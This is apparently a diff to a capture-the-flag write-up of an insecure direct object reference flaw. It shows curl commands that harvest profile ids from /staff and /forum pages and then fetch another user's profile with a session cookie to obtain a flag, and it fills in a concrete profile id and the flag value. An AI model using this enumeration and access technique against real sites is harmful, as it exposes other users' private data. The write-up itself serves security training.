@@ -19,11 +19,11 @@ curl -s -b jdoe.txt http://TARGET:4942/staff  | grep -oE '/profile/[a-z0-9]+' | 
 curl -s     http://TARGET:4942/forum          | grep -oE '/profile/[a-z0-9]+' | sort -u
 
 # request another user's profile directly
-curl -s -b jdoe.txt http://TARGET:4942/profile/<wil_profile_id> | grep -i flag
+curl -s -b jdoe.txt http://TARGET:4942/profile/k1asdfeditojrb4 | grep -i flag
 # FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
 ```
 
-> Fill in `<wil_profile_id>` with the exact id you used, for a reproducible record.
+> wil's profile id is `k1asdfeditojrb4`, harvested from the `/forum` and `/staff` "View profile →" links.
 
 ## Impact
 
